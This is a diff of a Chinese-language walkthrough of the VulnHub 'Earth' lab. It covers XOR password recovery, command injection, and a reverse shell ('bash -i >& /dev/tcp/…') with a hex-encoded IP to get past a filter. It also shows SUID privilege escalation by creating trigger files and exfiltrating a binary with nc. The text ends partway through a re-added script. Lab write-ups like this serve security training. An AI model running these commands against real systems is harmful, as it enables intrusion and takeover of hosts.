+<p>结果有如下内容，接着访问<code>https//terratest.earth.local/robots.txt</code></p>
+<pre tabindex="0"><code>/index.html           (Status: 200) [Size: 26]
+/robots.txt           (Status: 200) [Size: 521]</code></pre><p>发现有testingnotes文件，测试为txt格式，接着访问<code>https://terratest.earth.local/testingnotes.txt</code>，获得如下信息</p>
+<pre tabindex="0"><code>Testing secure messaging system notes:
+*Using XOR encryption as the algorithm, should be safe as used in RSA.
+*Earth has confirmed they have received our sent messages.
+*testdata.txt was used to test encryption.
+*terra used as username for admin portal.
+Todo:
+*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
+*Need to test different key lengths to protect against bruteforce. How long should the key be?
+*Need to improve the interface of the messaging interface and the admin panel, it&#39;s currently very basic.</code></pre><ul>
+<li>得知加密算法为XOR</li>
+<li>用户名为<code>terra</code></li>
+<li>存在<code>testdata.txt</code>文件用于测试加密</li>
+</ul>
+<p>接着访问<code>https://terratest.earth.local/testdata.txt</code>，获得如下信息</p>
+<pre tabindex="0"><code>According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</code></pre><p><strong>梳理下来</strong>，目前重要url有：
+<a href="https://earth.local/">https://earth.local/</a>
+<a href="https://earth.local/admin/">https://earth.local/admin/</a>
+<a href="https://terratest.earth.local/robots.txt">https://terratest.earth.local/robots.txt</a>
+<a href="https://terratest.earth.local/testingnotes.txt">https://terratest.earth.local/testingnotes.txt</a>
+<a href="https://terratest.earth.local/testdata.txt">https://terratest.earth.local/testdata.txt</a></p>
+<p>重要数据有：</p>
+<ul>
+<li>testdata中数据</li>
+</ul>
+<pre tabindex="0"><code>According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</code></pre><ul>
+<li>earth.local中数据，Previous Messages:</li>
+</ul>
+<pre tabindex="0"><code>00
+    37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
+    3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
+    2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</code></pre><h1 id="二漏洞攻击">二、漏洞攻击<a class="anchor" href="#%e4%ba%8c%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb">#</a></h1>
+<h2 id="21-密码破解">2.1 密码破解<a class="anchor" href="#21-%e5%af%86%e7%a0%81%e7%a0%b4%e8%a7%a3">#</a></h2>
+<p>根据提示，用XOR（异或）加密算法解密，编写的python脚本中，只用了<code>previous messages</code>中的最后一段，这是因为XOR运算具有<strong>排他性</strong>和<strong>长度匹配原则</strong>
 在<code>testdata.txt</code>文件中的已知明文长度约为300~400字节，而<code>previous messages</code>中只有第三段数据基本吻合，这三段数据可能是：第一段你好，第二段今天天气不错，第三段是地球起源介绍，如果用一段400字符长的文本去异或一段50字符长的数据，结果只有前50字节有意义
 即明文A被密钥B加密，生成的密文C字节长度一定等于明文A的字节长度，十六进制的密文共有790个字符，十六进制中，每2个字符代表1个字节，790/2=395字节，而英文包含了字母、空格、逗号、句号，UTF-8编码下，标准英文字符每个占1字节
-长度对比：记事本统计显示：字符数为403，十六进制数据长度换算后为395字节，暂时没弄清为什么这样</p><p>编写python脚本</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span><span style=color:#8b949e;font-style:italic># 第一段数据（十六进制字符串）</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span>hex_data <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#34;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span><span style=color:#8b949e;font-style:italic># 第二段数据（文本字符串）</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>text_data <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#34;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span><span style=color:#8b949e;font-style:italic># 将十六进制字符串转换为字节数组</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>data1 <span style=color:#ff7b72;font-weight:700>=</span> bytes<span style=color:#ff7b72;font-weight:700>.</span>fromhex(hex_data)
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span><span style=color:#8b949e;font-style:italic># 将文本字符串转换为字节数组（UTF-8 编码）</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>data2 <span style=color:#ff7b72;font-weight:700>=</span> text_data<span style=color:#ff7b72;font-weight:700>.</span>encode(<span style=color:#a5d6ff>&#39;utf-8&#39;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span><span style=color:#8b949e;font-style:italic># 对 data2 进行循环填充，使其长度与 data1 一致</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">14</span><span>data2_padded <span style=color:#ff7b72;font-weight:700>=</span> (data2 <span style=color:#ff7b72;font-weight:700>*</span> (len(data1) <span style=color:#ff7b72;font-weight:700>//</span> len(data2) <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>1</span>))[:len(data1)]
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">15</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">16</span><span><span style=color:#8b949e;font-style:italic># 逐字节异或</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">17</span><span>result <span style=color:#ff7b72;font-weight:700>=</span> bytes([a <span style=color:#ff7b72;font-weight:700>^</span> b <span style=color:#ff7b72>for</span> a, b <span style=color:#ff7b72;font-weight:700>in</span> zip(data1, data2_padded)])
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">18</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">19</span><span><span style=color:#8b949e;font-style:italic># 输出异或结果（十六进制形式）</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">20</span><span>print(<span style=color:#a5d6ff>&#34;XOR Result (Hex):&#34;</span>, result<span style=color:#ff7b72;font-weight:700>.</span>hex())
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">21</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">22</span><span><span style=color:#8b949e;font-style:italic># 尝试将异或结果解码为文本（UTF-8）</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">23</span><span><span style=color:#ff7b72>try</span>:
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">24</span><span>    decoded_text <span style=color:#ff7b72;font-weight:700>=</span> result<span style=color:#ff7b72;font-weight:700>.</span>decode(<span style=color:#a5d6ff>&#39;utf-8&#39;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">25</span><span>    print(<span style=color:#a5d6ff>&#34;Decoded Text:&#34;</span>, decoded_text)
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">26</span><span><span style=color:#ff7b72>except</span> <span style=color:#f0883e;font-weight:700>UnicodeDecodeError</span>:
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">27</span><span>    print(<span style=color:#a5d6ff>&#34;Result is not readable as UTF-8 text.&#34;</span>)</span></span></code></pre></div><p>运行python脚本</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>┌──<span style=color:#ff7b72;font-weight:700>(</span>kali㉿kali<span style=color:#ff7b72;font-weight:700>)</span>-<span style=color:#ff7b72;font-weight:700>[</span>~/Desktop/vulnhub/earth<span style=color:#ff7b72;font-weight:700>]</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>└─$ python xor.py                           
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>XOR Result <span style=color:#ff7b72;font-weight:700>(</span>Hex<span style=color:#ff7b72;font-weight:700>)</span>: 6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>Decoded Text: earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span></span></code></pre></div><ul><li>输出为重复的<code>earthclimatechangebad4humans</code>，推测为管理员密码</li></ul><h2 id=22-获取user_flag>2.2 获取user_flag<a class=anchor href=#22-%e8%8e%b7%e5%8f%96user_flag>#</a></h2><p>使用账户名<code>terra</code>，以及密码<code>earthclimatechangebad4humans</code>，进行登录。
-见到CLI command界面，运行id，得到<code>Command output: uid=48(apache) gid=48(apache) groups=48(apache)</code>，发现这里是一个command injection的命令窗口</p><p>尝试直接查找flag，<code>find / -name "*flag*"</code>，结果有<code>/var/earth_web/user_flag.txt</code>
-查看此文件，发现结果</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>Command output: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d] </span></span></code></pre></div><p>获得了普通用户权限的flag</p><h2 id=23-反弹shell>2.3 反弹shell<a class=anchor href=#23-%e5%8f%8d%e5%bc%b9shell>#</a></h2><p>尝试直接使用反弹shell，在kali中监听<code>nc -lvnp 7777</code>，接着命令注入<code>bash -i >& /dev/tcp/192.168.174.131/7777 0>&amp;1</code>，但被拦截
-尝试将IP转换为十六进制格式，<code>bash -i >& /dev/tcp/0xc0a8ae83/7777 0>&amp;1</code>，成功反弹。</p><h1 id=三提权>三、提权<a class=anchor href=#%e4%b8%89%e6%8f%90%e6%9d%83>#</a></h1><h2 id=31-查找可提权命令>3.1 查找可提权命令<a class=anchor href=#31-%e6%9f%a5%e6%89%be%e5%8f%af%e6%8f%90%e6%9d%83%e5%91%bd%e4%bb%a4>#</a></h2><p>找具有SUID权限的文件
-<code>find / -perm -u=s -type f 2>/dev/null</code>，结果中有<code>/usr/bin/reset_root</code>文件</p><h2 id=32-reset_root分析>3.2 reset_root分析<a class=anchor href=#32-reset_root%e5%88%86%e6%9e%90>#</a></h2><p>启动<code>reset_root</code>文件</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>bash-5.1$ reset_root
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>reset_root
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>CHECKING IF RESET TRIGGERS PRESENT...
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.</span></span></code></pre></div><p>失败，所有触发器都不存在</p><p>本地没有调试命令，使用nc传送到本地调试</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span><span style=color:#8b949e;font-style:italic># kali，输出重定向，将接收到的网络数据保存到名为reset_root的新文件中</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>nc -lnvp <span style=color:#a5d6ff>7777</span> &gt; reset_root
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span><span style=color:#8b949e;font-style:italic># 靶机，输入重定向，将靶机原本有的reset_root文件内容喂给nc，通过网络发出去</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>nc 192.168.174.131 <span style=color:#a5d6ff>7777</span> &lt; /usr/bin/reset_root</span></span></code></pre></div><p>使用strace调试，<code>sudo strace ./reset root</code>，发现没有如下文件：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>access<span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>&#34;/dev/shm/kHgTFI5G&#34;</span>, F_OK<span style=color:#ff7b72;font-weight:700>)</span>       <span style=color:#ff7b72;font-weight:700>=</span> -1 ENOENT <span style=color:#ff7b72;font-weight:700>(</span>No such file or directory<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>access<span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>&#34;/dev/shm/Zw7bV9U5&#34;</span>, F_OK<span style=color:#ff7b72;font-weight:700>)</span>       <span style=color:#ff7b72;font-weight:700>=</span> -1 ENOENT <span style=color:#ff7b72;font-weight:700>(</span>No such file or directory<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>access<span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>&#34;/tmp/kcM0Wewe&#34;</span>, F_OK<span style=color:#ff7b72;font-weight:700>)</span>           <span style=color:#ff7b72;font-weight:700>=</span> -1 ENOENT <span style=color:#ff7b72;font-weight:700>(</span>No such file or directory<span style=color:#ff7b72;font-weight:700>)</span></span></span></code></pre></div><p>于是靶机上创建这三个文件，再次运行reset_root</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>touch /dev/shm/kHgTFI5G
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>touch /dev/shm/Zw7bV9U5
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>touch /tmp/kcM0Wewe</span></span></code></pre></div><p>得到如下信息</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>CHECKING IF RESET TRIGGERS PRESENT...
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth</span></span></code></pre></div><p>得到了root密码<code>Earth</code>，使用<code>su root</code>切换为root模式，再<code>cd /root</code>，<code>cat root_flag.txt</code>，得到最终flag<code>[root_flag_b0da9554d29db2117b02aa8b66ec492e]</code></p><h1 id=四总结>四、总结<a class=anchor href=#%e5%9b%9b%e6%80%bb%e7%bb%93>#</a></h1><p>信息收集发现web服务和管理后台，利用xor加密特性破解管理员密码，成功获取用户权限并反弹shell，通过分析SUID文件并创建触发器文件提权到root</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div></div><div></div></div><div class="flex flex-wrap justify-between"><span><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-noob_1/ class="flex align-center"><img src=/icons/backward.svg class=book-icon alt=Backward>
-<span>Noob: 1</span>
-</a></span><span><a href=/docs/cybersecurity/vulnhub/medium/vulnhub-empire_lupinone/ class="flex align-center"><span>Empire lupinone</span>
-<img src=/icons/forward.svg class=book-icon alt=Forward></a></span></div><div class=book-comments></div><style>.minimal-round-btn{position:fixed;right:4px;bottom:4px;z-index:9999;width:45px;height:45px;display:flex;align-items:center;justify-content:center;opacity:.2;transition:opacity .3s ease,transform .3s ease}.minimal-round-btn img{width:100%;height:100%;border-radius:50%;object-fit:cover;border:1.5px solid #30363d;background:#0d1117;box-shadow:0 4px 10px rgba(0,0,0,.5)}.minimal-round-btn:hover{opacity:1;transform:scale(1.1)}.minimal-round-btn:hover img{border-color:#58a6ff}@media screen and (max-width:768px){.minimal-round-btn{display:none}}</style><a href=/posts/ class=minimal-round-btn><img src=/donk.png alt=随笔></a><footer class=custom-footer><span class=status-dot></span>
-<span>2026 vnccer <a href=https://creativecommons.org/licenses/by/4.0/ target=_blank class=license-link>CC BY 4.0</a></span></footer><script>function toggleSidebar(){const e=document.querySelector("main.container");e.classList.toggle("sidebar-collapsed");const t=e.classList.contains("sidebar-collapsed");localStorage.setItem("sidebar-collapsed",t)}document.addEventListener("DOMContentLoaded",()=>{const o=document.querySelector("main.container"),i=document.documentElement;localStorage.getItem("sidebar-collapsed")==="true"&&o.classList.add("sidebar-collapsed"),setTimeout(()=>{i.classList.remove("sidebar-collapsed-init")},10);const e=document.querySelectorAll(".book-toc #TableOfContents a"),n=document.querySelectorAll("main article.markdown h1[id], main article.markdown h2[id], main article.markdown h3[id], main article.markdown h4[id]");if(e.length===0||n.length===0)return;let t=!1,s;const a=()=>{e.forEach(n=>{n.addEventListener("click",function(){t=!0,clearTimeout(s),e.forEach(e=>e.classList.remove("active")),this.classList.add("active"),s=setTimeout(()=>{t=!1},800)})})},r=()=>{const s=new IntersectionObserver(n=>{if(t)return;const s=n.filter(e=>e.isIntersecting);if(s.length>0){const n=s[s.length-1],o=n.target.getAttribute("id"),t=document.querySelector(`.book-toc #TableOfContents a[href="#${o}"]`);t&&(e.forEach(e=>e.classList.remove("active")),t.classList.add("active"))}},{root:null,rootMargin:"-5% 0px -80% 0px",threshold:0});n.forEach(e=>s.observe(e))};a(),r()})</script><a href=/docs/cybersecurity/vulnhub/easy/ class=minimal-back-btn title><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg></a><div id=cheat-video-modal><div class=close-video title=关闭>×</div><video id=cheat-video-player controls preload=auto playsinline>
-<source src=/video/cheat.mp4 type=video/mp4>您的浏览器不支持视频标签。</video></div><script>document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("cheat-video-modal"),t=document.getElementById("cheat-video-player"),n=document.querySelector(".close-video"),o=document.querySelectorAll('a[href="#cheat"]');o.forEach(n=>{n.addEventListener("click",function(n){n.preventDefault(),e.classList.add("active"),t.volume=.5,t.load();let s=t.play();s!==0[0]&&s.then(e=>{console.log("🚀 彩蛋视频带声音播放成功！")}).catch(e=>{console.error("❌ 浏览器策略拦截:",e)})})});const s=()=>{e.classList.remove("active"),t.pause(),t.currentTime=0};n&&n.addEventListener("click",s),e&&e.addEventListener("click",function(t){t.target===e&&s()})})</script><script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#一信息收集>一、信息收集</a><ul><li><a href=#11-端口信息收集>1.1 端口信息收集</a></li><li><a href=#12-web信息收集>1.2 Web信息收集</a><ul><li><a href=#121-域名earthlocal>1.2.1 域名earth.local</a></li><li><a href=#122-子域名terratestearthlocal>1.2.2 子域名terratest.earth.local</a></li></ul></li></ul></li><li><a href=#二漏洞攻击>二、漏洞攻击</a><ul><li><a href=#21-密码破解>2.1 密码破解</a></li><li><a href=#22-获取user_flag>2.2 获取user_flag</a></li><li><a href=#23-反弹shell>2.3 反弹shell</a></li></ul></li><li><a href=#三提权>三、提权</a><ul><li><a href=#31-查找可提权命令>3.1 查找可提权命令</a></li><li><a href=#32-reset_root分析>3.2 reset_root分析</a></li></ul></li><li><a href=#四总结>四、总结</a></li></ul></nav></div></aside></main></body></html>
+长度对比：记事本统计显示：字符数为403，十六进制数据长度换算后为395字节，暂时没弄清为什么这样</p>
+<p>编写python脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#78787e"># 第一段数据（十六进制字符串）</span>
+</span></span><span style="display:flex;"><span>hex_data <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 第二段数据（文本字符串）</span>
+</span></span><span style="display:flex;"><span>text_data <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 将16进制字符串转为原始2进制字节</span>
+</span></span><span style="display:flex;"><span>data1 <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">bytes</span><span style="color:#ff6ac1">.</span>fromhex(hex_data)
+</span></span><span style="display:flex;"><span>
